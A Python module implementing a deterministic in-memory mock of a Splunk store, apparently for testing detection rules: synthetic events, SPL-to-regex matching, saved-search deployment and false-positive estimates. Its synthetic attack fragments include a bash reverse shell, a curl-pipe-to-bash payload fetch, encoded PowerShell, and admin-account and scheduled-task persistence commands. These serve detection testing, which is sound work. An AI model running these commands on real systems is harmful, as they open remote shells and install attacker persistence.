"""In-memory event + saved-search store backing the mock.

Deterministic: same seed → same events. The store is intentionally small —
12 hosts, ~5000 events over 7 days — so tests are quick and the LLM never
sees firehose-scale rollups.
"""

from __future__ import annotations

import random
import re
from collections import Counter
from collections.abc import Iterable
from datetime import UTC, datetime, timedelta
from threading import RLock
from typing import Any

from .models import (
    FPBucket,
    FPReport,
    SavedSearch,
    SearchSample,
    SearchSummary,
)

DEFAULT_SEED = 20260513

# FP-rate verdict bands (matches the brief's <5/day "low" definition).
FP_LOW_THRESHOLD = 5
FP_MEDIUM_THRESHOLD = 50
# Fraction of events that look attacker-shaped; pure synthetic data so
# nothing crypto-sensitive lives in this module.
ATTACK_RATIO = 0.1
NO_USER_PROB = 0.05

HOSTS = [
    "lab-win-01",
    "lab-win-02",
    "lab-win-03",
    "lab-win-dc01",
    "lab-linux-01",
    "lab-linux-02",
    "lab-linux-03",
    "lab-mac-01",
    "corp-finance-01",
    "corp-eng-12",
    "corp-eng-34",
    "corp-hr-02",
]

USERS = [
    "alice",
    "bob",
    "carol",
    "dan",
    "eve",
    "svc_backup",
    "svc_sccm",
    "Administrator",
    "SYSTEM",
]

SOURCETYPES = [
    "WinEventLog:Microsoft-Windows-Sysmon/Operational",
    "WinEventLog:Security",
    "linux:audit",
    "linux:syslog",
]

_ATTACK_FRAGMENTS = [
    "powershell.exe -EncodedCommand JABzAD0AIgBoAGUAbABsAG8AIgA=",
    "powershell.exe -enc bm90ZXBhZA==",
    "cmd.exe /c net user admin /add",
    "wmic.exe process call create 'powershell.exe -nop -w hidden -c IEX'",
    "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
    "curl -s http://198.51.100.7/payload.sh | bash",
    "rundll32.exe shell32.dll,Control_RunDLL malicious.cpl",
    "schtasks /create /tn t /tr c:\\evil.exe /sc daily",
]

_BENIGN_FRAGMENTS = [
    "explorer.exe",
    "OUTLOOK.EXE /recycle",
    "chrome.exe --type=renderer",
    "sshd: Accepted publickey for alice",
    "sudo cat /var/log/syslog",
    "apt-get update",
    "python3 -m http.server 8000",
    "git pull origin main",
]


def _generate_events(seed: int, days: int) -> list[dict[str, Any]]:
    # Synthetic test data; not a security boundary.
    rng = random.Random(seed)  # noqa: S311
    now = datetime.now(tz=UTC).replace(minute=0, second=0, microsecond=0)
    events: list[dict[str, Any]] = []
    for d in range(days):
        day = now - timedelta(days=d)
        # 500-800 events per day, 10% malicious-looking.
        n = rng.randint(500, 800)
        for _ in range(n):
            t_offset = rng.randint(0, 86400 - 1)
            ts = day - timedelta(seconds=t_offset)
            is_attack = rng.random() < ATTACK_RATIO
            frag = rng.choice(_ATTACK_FRAGMENTS if is_attack else _BENIGN_FRAGMENTS)
            host = rng.choice(HOSTS)
            user = rng.choice(USERS) if rng.random() > NO_USER_PROB else None
            sourcetype = rng.choice(SOURCETYPES)
            events.append(
                {
                    "_time": ts.isoformat(),
                    "_epoch": ts.timestamp(),
                    "host": host,
                    "user": user,
                    "source": f"/var/log/{sourcetype.split(':')[-1].lower()}",
                    "sourcetype": sourcetype,
                    "raw": frag,
                }
            )
    events.sort(key=lambda e: e["_epoch"], reverse=True)
    return events


def _spl_to_regex(spl: str) -> re.Pattern[str]:
    """Translate a tiny subset of SPL into a regex over event `raw` strings.

    Recognises bare tokens and `field=value` / `field="value with spaces"`
    forms. Anything more elaborate becomes a permissive substring search.
    This is enough for the Phase 2 demo; real Splunk does the heavy lifting
    when we flip mock→real.
    """
    parts: list[str] = []
    for match in re.finditer(r"(\w+)\s*=\s*\"([^\"]+)\"|(\w+)\s*=\s*(\S+)|\"([^\"]+)\"|(\S+)", spl):
        groups = [g for g in match.groups() if g]
        if not groups:
            continue
        token = groups[-1]
        # Drop SPL directives (the `search` command, `index=`/time modifiers):
        # for a field=value match the field name is what identifies noise, and
        # for a bare token the token itself is.
        field_name = match.group(1) or match.group(3)
        if (field_name or token).lower() in {"search", "index", "earliest", "latest"}:
            continue
        parts.append(re.escape(token))
    if not parts:
        return re.compile(r"(?!)")  # never matches
    return re.compile("|".join(parts), re.IGNORECASE)


def _date_key(epoch: float) -> str:
    return datetime.fromtimestamp(epoch, tz=UTC).date().isoformat()


class SplunkStore:
    """Thread-safe in-memory state behind the mock MCP tools."""

    def __init__(self, seed: int = DEFAULT_SEED, history_days: int = 7) -> None:
        self._lock = RLock()
        self._events: list[dict[str, Any]] = _generate_events(seed, history_days)
        self._saved: dict[tuple[str, str], SavedSearch] = {}
        self._seed_initial_saved_searches()

    def _seed_initial_saved_searches(self) -> None:
        for i in range(50):
            name = f"detect_synth_{i:02d}"
            self._saved[("search", name)] = SavedSearch(
                name=name,
                app="search",
                owner="catchattack",
                search=f"index=test sourcetype=WinEventLog:* synthetic_tag={i}",
                schedule="*/30 * * * *",
                index_target="test",
                disabled=False,
            )

    # ---- search ------------------------------------------------------------

    def search(self, spl: str, earliest: str, latest: str, max_results: int) -> SearchSummary:
        with self._lock:
            try:
                earliest_dt = datetime.fromisoformat(earliest.replace("Z", "+00:00"))
                latest_dt = datetime.fromisoformat(latest.replace("Z", "+00:00"))
            except ValueError as exc:
                raise ValueError(f"earliest/latest must be ISO8601: {exc}") from exc
            pat = _spl_to_regex(spl)
            hits = [
                e
                for e in self._events
                if earliest_dt.timestamp() <= e["_epoch"] <= latest_dt.timestamp()
                and pat.search(e["raw"])
            ]
            top_hosts = Counter(e["host"] for e in hits).most_common(5)
            top_users = Counter(e["user"] for e in hits if e["user"]).most_common(5)
            top_sources = Counter(e["sourcetype"] for e in hits).most_common(5)
            samples = [
                SearchSample.model_validate(
                    {
                        "_time": e["_time"],
                        "host": e["host"],
                        "user": e["user"],
                        "source": e["source"],
                        "sourcetype": e["sourcetype"],
                        "raw": e["raw"][:500],
                    }
                )
                for e in hits[: max(0, min(10, max_results))]
            ]
            return SearchSummary(
                spl=spl,
                earliest=earliest,
                latest=latest,
                count=len(hits),
                top_hosts=top_hosts,
                top_users=top_users,
                top_sources=top_sources,
                samples=samples,
                truncated=len(hits) > len(samples),
            )

    # ---- list_saved_searches ----------------------------------------------

    def list_saved_searches(self, app: str | None) -> list[SavedSearch]:
        with self._lock:
            items: Iterable[SavedSearch] = self._saved.values()
            if app:
                items = (s for s in items if s.app == app)
            return sorted(items, key=lambda s: (s.app, s.name))

    # ---- deploy_rule -------------------------------------------------------

    def deploy_rule(
        self,
        name: str,
        spl: str,
        schedule: str,
        index_target: str,
        app: str = "search",
        owner: str = "catchattack",
        *,
        dry_run: bool,
    ) -> tuple[str, SavedSearch | None]:
        stanza = (
            f"[{name}]\n"
            f"search = {spl}\n"
            f"cron_schedule = {schedule}\n"
            f"dispatch.earliest_time = -15m\n"
            f"dispatch.latest_time = now\n"
            f"action.summary_index = 1\n"
            f"action.summary_index._name = {index_target}\n"
            f"is_scheduled = 1\n"
        )
        if dry_run:
            return stanza, None
        ss = SavedSearch(
            name=name,
            app=app,
            owner=owner,
            search=spl,
            schedule=schedule,
            index_target=index_target,
            disabled=False,
        )
        with self._lock:
            self._saved[(app, name)] = ss
        return stanza, ss

    # ---- estimate_fp_rate --------------------------------------------------

    def estimate_fp_rate(self, spl: str, lookback_days: int) -> FPReport:
        with self._lock:
            now = datetime.now(tz=UTC)
            earliest = (now - timedelta(days=lookback_days)).timestamp()
            pat = _spl_to_regex(spl)
            hits = [e for e in self._events if e["_epoch"] >= earliest and pat.search(e["raw"])]
            by_day = Counter(_date_key(e["_epoch"]) for e in hits)
            buckets = [
                FPBucket(date=date, hits=by_day.get(date, 0))
                for date in sorted(by_day.keys(), reverse=True)
            ]
            counts = sorted([b.hits for b in buckets])
            if counts:
                idx = max(0, int(0.95 * (len(counts) - 1)))
                p95 = counts[idx]
            else:
                p95 = 0
            unique_hosts = len({e["host"] for e in hits})
            verdict = (
                "low"
                if p95 < FP_LOW_THRESHOLD
                else ("medium" if p95 < FP_MEDIUM_THRESHOLD else "high")
            )
            return FPReport(
                spl=spl,
                lookback_days=lookback_days,
                total_hits=len(hits),
                hits_per_day=buckets,
                unique_hosts=unique_hosts,
                p95_hits_per_day=p95,
                verdict=verdict,
            )
